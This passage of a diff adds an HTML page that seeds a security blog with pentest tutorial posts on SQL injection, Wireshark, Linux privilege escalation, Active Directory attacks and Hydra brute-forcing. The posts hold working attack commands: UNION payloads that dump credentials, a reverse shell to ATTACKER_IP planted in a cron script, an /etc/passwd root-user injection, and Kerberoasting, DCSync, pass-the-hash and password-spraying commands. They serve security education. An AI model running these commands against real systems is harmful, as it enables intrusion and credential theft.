+| Error-based | DB errors shown | \`' AND extractvalue(1,concat(0x7e,user()))-- -\` |
+| Boolean blind | True/false responses | \`' AND 1=1-- -\` |
+| Time-based blind | No output at all | \`' AND SLEEP(5)-- -\` |
+
+## Manual Testing Steps
+
+### Step 1 — Detect the injection point
+
+\`\`\`sql
+'
+''
+\`
+' OR '1'='1
+-- -
+\`\`\`
+
+### Step 2 — Find number of columns
+
+\`\`\`sql
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -   -- increment until error
+\`\`\`
+
+### Step 3 — Find visible columns
+
+\`\`\`sql
+' UNION SELECT null,null,null-- -
+' UNION SELECT 1,2,3-- -
+\`\`\`
+
+### Step 4 — Extract data
+
+\`\`\`sql
+' UNION SELECT user(),database(),version()-- -
+
+-- List all tables
+' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()-- -
+
+-- List columns for 'users'
+' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -
+
+-- Dump credentials
+' UNION SELECT username,password FROM users-- -
+\`\`\`
+
+:::tip Pro Tip
+Try different comment styles: \`-- -\`, \`#\`, \`/**/\`. WAFs often block spaces — use \`/**/\` to bypass.
+:::
+
+## SQLMap Automation
+
+\`\`\`bash
+# Basic scan
+sqlmap -u "http://target.com/page?id=1"
+
+# List databases
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Dump a database
+sqlmap -u "http://target.com/page?id=1" -D dbname --dump
+
+# POST request
+sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
+
+# With session cookie
+sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"
+
+# Max aggression
+sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
+\`\`\`
+
+## Prevention
+
+\`\`\`python
+# INSECURE — never do this
+query = "SELECT * FROM users WHERE name = '" + user_input + "'"
+
+# SECURE — parameterized query
+cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
+\`\`\`
+
+:::danger Critical
+Never concatenate user input into SQL queries. Use parameterized queries or prepared statements — always.
+:::`,
+          },
+          {
+            id: 'seed-3', title: 'Wireshark for Blue Teamers: Packet Analysis',
+            filename: 'wireshark-pcap.md', tag: 'Blue Team', tagColor: 'cyan',
+            date: 'Feb 2026',
+            excerpt: 'How to use Wireshark display filters, stream analysis, and threat hunting to detect suspicious traffic like C2 beaconing, data exfiltration, and credential sniffing.',
+            body: `## Why Wireshark for Blue Teamers?
+
+Wireshark is the most widely-used packet analyzer. It lets you capture and inspect network traffic in real-time — essential for incident response, threat hunting, and forensics.
+
+## Essential Display Filters
+
+\`\`\`wireshark
+# HTTP traffic only
+http
+
+# Filter by IP address
+ip.addr == 192.168.1.100
+ip.src == 10.0.0.1
+ip.dst == 8.8.8.8
+
+# Filter by port
+tcp.port == 443
+udp.port == 53
+
+# DNS queries
+dns
+
+# TCP SYN only (new connections)
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+# Large packets — possible exfiltration
+frame.len > 1400
+
+# POST requests containing credentials
+http.request.method == POST
+ftp.request.command == PASS
+\`\`\`
+
+## Capturing Traffic
+
+\`\`\`bash
+# Launch Wireshark on eth0
+wireshark -i eth0
+
+# Capture to a file via tcpdump
+tcpdump -i any -w capture.pcap
+tcpdump -i eth0 port 443 -w https_traffic.pcap
+\`\`\`
+
+## Detecting C2 Beaconing
+
+C2 (command-and-control) beaconing is characterized by **periodic, regular outbound connections** to an external IP.
+
+**Signs to look for:**
+- Regular-interval connections (every 30s / 60s)
+- Unusual high-numbered ports
+- Long-duration sessions with tiny data volume
+- Connections to IPs with no PTR (reverse DNS) record
+
+\`\`\`wireshark
+# Focus on a suspicious IP
+ip.dst == <suspicious_ip>
+
+# Unusual outbound ports
+tcp.dstport > 10000 && !(ip.dst == 192.168.0.0/16)
+\`\`\`
+
+:::tip Pro Tip
+Use **Statistics → Conversations** to instantly spot hosts with unusual traffic volumes or connection counts.
+:::
+
+## Following TCP Streams
+
+Right-click any packet → **Follow → TCP Stream** to reconstruct the full conversation in cleartext. Essential for HTTP, FTP, Telnet analysis.
+
+## Exporting Files from Captures
+
+- **File → Export Objects → HTTP** — extract files sent over HTTP
+- **File → Export Objects → SMB** — extract files from captured SMB shares
+
+:::info
+Save suspicious captures with \`Ctrl+Shift+S\` and share them with your team for further analysis.
+:::`,
+          },
+          {
+            id: 'seed-4', title: 'Linux Privilege Escalation: Common Techniques',
+            filename: 'linux-privesc.md', tag: 'Pentesting', tagColor: 'red',
+            date: 'Mar 2026',
+            excerpt: 'A structured walkthrough of sudo misconfigurations, SUID binaries, cron job hijacking, and kernel exploits — with real examples from HackTheBox and TryHackMe machines.',
+            body: `## The Goal
+
+After getting a foothold, the aim is to escalate from a low-privileged shell to **root**. Here are the most reliable paths.
+
+## Initial Enumeration
+
+Always start here. Use LinPEAS for automated checks:
+
+\`\`\`bash
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+\`\`\`
+
+Manual checks:
+
+\`\`\`bash
+# Who am I?
+id && whoami
+
+# Kernel version
+uname -a
+
+# OS info
+cat /etc/os-release
+
+# Find writable files
+find / -writable 2>/dev/null | grep -v proc
+
+# SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# Running services
+ps aux | grep root
+\`\`\`
+
+## Sudo Misconfigurations
+
+\`\`\`bash
+sudo -l
+\`\`\`
+
+If you see \`(ALL) NOPASSWD: /usr/bin/vim\`, check [GTFOBins](https://gtfobins.github.io):
+
+\`\`\`bash
+sudo vim -c '!bash'
+sudo find . -exec /bin/sh \\; -quit
+sudo python3 -c 'import os; os.system("/bin/bash")'
+\`\`\`
+
+:::tip
+Every binary on GTFOBins has specific exploit paths for sudo, SUID, and cron. Always check it first.
+:::
+
+## SUID Binaries
+
+\`\`\`bash
+find / -perm -4000 -type f 2>/dev/null
+\`\`\`
+
+Commonly exploitable: \`bash\`, \`find\`, \`nmap\`, \`python\`, \`less\`, \`vim\`
+
+\`\`\`bash
+# SUID find
+find . -exec /bin/sh -p \\; -quit
+
+# SUID bash
+/bin/bash -p
+\`\`\`
+
+## Cron Job Hijacking
+
+\`\`\`bash
+cat /etc/crontab
+ls -la /etc/cron*
+\`\`\`
+
+If a cron runs a **script you can write to**:
+
+\`\`\`bash
+echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/script.sh
+nc -lvnp 4444
+\`\`\`
+
+## Writable /etc/passwd
+
+\`\`\`bash
+# Generate password hash
+openssl passwd -1 -salt hack h4cked
+
+# Add a new root-level user
+echo 'owneduser:$1$hack$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+su owneduser
+\`\`\`
+
+:::danger
+In real engagements, modifying \`/etc/passwd\` is noisy and leaves evidence. Document and revert after testing.
+:::
+
+## Kernel Exploits (Last Resort)
+
+\`\`\`bash
+uname -r
+searchsploit linux kernel 4.4.0
+\`\`\`
+
+Notable examples: **DirtyCow** (CVE-2016-5195), **PwnKit** (CVE-2021-4034). Always verify the version before running — some exploits will crash or corrupt the machine.`,
+          },
+          {
+            id: 'seed-5', title: 'Active Directory Attacks with BloodHound & Impacket',
+            filename: 'ad-bloodhound.md', tag: 'Active Directory', tagColor: 'purple',
+            date: 'Mar 2026',
+            excerpt: 'Using BloodHound to map AD attack paths, identifying Kerberoastable accounts, ASREPRoasting, and Pass-the-Hash techniques using Impacket\'s suite of tools.',
+            body: `## Active Directory Attacks Overview
+
+Active Directory (AD) is the most common enterprise identity system and almost always the primary target in internal pentests. This post covers the most impactful attack paths.
+
+## BloodHound — Mapping the Attack Path
+
+BloodHound visualizes AD object relationships and finds the shortest path to Domain Admin.
+
+### Collect Data with SharpHound
+
+\`\`\`powershell
+# Windows — SharpHound executable
+.\\SharpHound.exe -c All
+
+# PowerShell version
+Invoke-BloodHound -CollectionMethod All
+\`\`\`
+
+Upload the resulting \`.zip\` to BloodHound GUI, then use:
+**Analysis → Find Shortest Paths to Domain Admins**
+
+:::tip Pro Tip
+"Find Principals with DCSync Rights" and "Find Kerberoastable Users" are the first queries I run on every engagement.
+:::
+
+## Kerberoasting
+
+Request a TGS ticket for any service account — the ticket is encrypted with the account's NTLM hash and can be cracked offline.
+
+\`\`\`bash
+# Impacket
+python3 GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.hash
+
+# Crack with hashcat
+hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
+\`\`\`
+
+## ASREPRoasting
+
+Targets accounts with **"Do not require Kerberos preauthentication"** enabled.
+
+\`\`\`bash
+# Get AS-REP hashes (no credentials needed)
+python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash
+
+# Crack
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+\`\`\`
+
+## Pass-the-Hash (PtH)
+
+NTLM hashes extracted from memory let you authenticate without knowing the plaintext.
+
+\`\`\`bash
+# Dump hashes from DC
+python3 secretsdump.py domain.local/user:password@dc-ip
+
+# Lateral movement with PtH
+python3 psexec.py -hashes :NTLMHASH admin@target-ip
+python3 wmiexec.py -hashes :NTLMHASH domain.local/admin@target-ip
+\`\`\`
+
+## DCSync Attack
+
+With \`DS-Replication-Get-Changes-All\` rights:
+
+\`\`\`bash
+python3 secretsdump.py -just-dc-user krbtgt domain.local/user:password@dc-ip
+\`\`\`
+
+This yields the **krbtgt hash** — enabling Golden Ticket attacks.
+
+## Attack Summary
+
+| Attack | Requires | Result |
+|--------|----------|--------|
+| Kerberoasting | Valid user creds | Service account hash |
+| ASREPRoast | Userlist | Account without preauth |
+| Pass-the-Hash | NTLM hash | Lateral movement |
+| DCSync | Replication rights | Full domain dump |
+
+:::warn
+AD attacks leave traces in Event Logs (IDs 4768, 4769, 4776). Blue teams monitor these actively. Stay quiet.
+:::`,
+          },
+          {
+            id: 'seed-6', title: 'Credential Attacks with Hydra & Wordlists',
+            filename: 'hydra-bruteforce.md', tag: 'Tooling', tagColor: 'green',
+            date: 'Mar 2026',
+            excerpt: 'Practical guide to online brute-forcing with Hydra targeting SSH, FTP, HTTP forms, and RDP. Covers wordlist selection, rate limiting, and responsible testing scope.',
+            body: `## What is Hydra?
+
+Hydra is a fast, parallelized online password brute-forcing tool supporting 50+ protocols. It\'s a staple for testing authentication strength during pentests.
+
+:::warn Scope Warning
+Only use Hydra against systems you own or have **explicit written authorization** to test. Brute-force attacks can lock accounts and disrupt services.
+:::
+
+## Basic Syntax
+
+\`\`\`bash
+hydra -l <user> -P <wordlist> <protocol>://<target>
+hydra -L <userlist> -P <wordlist> <protocol>://<target>
+\`\`\`
+
+## SSH
+
+\`\`\`bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
+
+# Custom port, limited threads
+hydra -l root -P passwords.txt -t 4 -s 2222 ssh://192.168.1.1
+\`\`\`
+
+## FTP
+
+\`\`\`bash
+hydra -l admin -P rockyou.txt ftp://192.168.1.1
+\`\`\`
+
+## HTTP Form (POST)
+
+\`\`\`bash
+hydra -l admin -P rockyou.txt 192.168.1.1 \\
+  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
+\`\`\`
+
+Format: \`path : POST body : failure string\`
+
+## HTTP Basic Auth
+
+\`\`\`bash
+hydra -l admin -P rockyou.txt http-get://192.168.1.1/admin
+\`\`\`
+
+## RDP
+
+\`\`\`bash
+hydra -l administrator -P rockyou.txt rdp://192.168.1.1 -t 1
+\`\`\`
+
+:::tip
+Use \`-t 1\` for RDP — it has strict connection limits and will lock accounts fast if you go wide open.
+:::
+
+## Wordlists
+
+| Wordlist | Best For |
+|----------|----------|
+| \`rockyou.txt\` | General use, most common passwords |
+| \`SecLists/Passwords/Common-Credentials/\` | Curated targeted lists |
+| \`cewl http://target.com\` | Custom list from the target site |
+| \`crunch\` | Generate patterns (e.g., Admin1234) |
+
+## Custom Wordlist with CeWL
+
+\`\`\`bash
+cewl http://target.com -d 2 -m 6 -w wordlist.txt
+\`\`\`
+
+## Pattern Generation with Crunch
+
+\`\`\`bash
+# 8-char alphanumeric
+crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
+
+# Pattern: Admin + 4 digits
+crunch 9 9 -t Admin%%%% -o targeted.txt
+\`\`\`
+
+## Spray Before You Brute
+
+Password spraying (one password, many users) is far less noisy than full brute-force:
+
+\`\`\`bash
+hydra -L users.txt -p 'Welcome1!' ssh://target
+hydra -L users.txt -p 'Winter2026!' rdp://target
+\`\`\`
+
+:::info
+Always try default credentials first: \`admin:admin\`, \`admin:password\`, \`root:toor\`. Many devices are never changed from factory defaults.
+:::`,
+          },
+        ];
+        var existing = getPosts();
+        var ids = existing.map(function (p) { return p.id; });
+        defaults.forEach(function (p) {
+          if (!ids.includes(p.id)) existing.unshift(p);
+        });
+        savePosts(existing);
+        localStorage.setItem(SEED_KEY, '1');
+      }
+
+      // Load saved posts on page start
+      seedDefaultPosts();
+      renderDynamicPosts();
+    })();
+  </script>
+
+</body>
+</html>
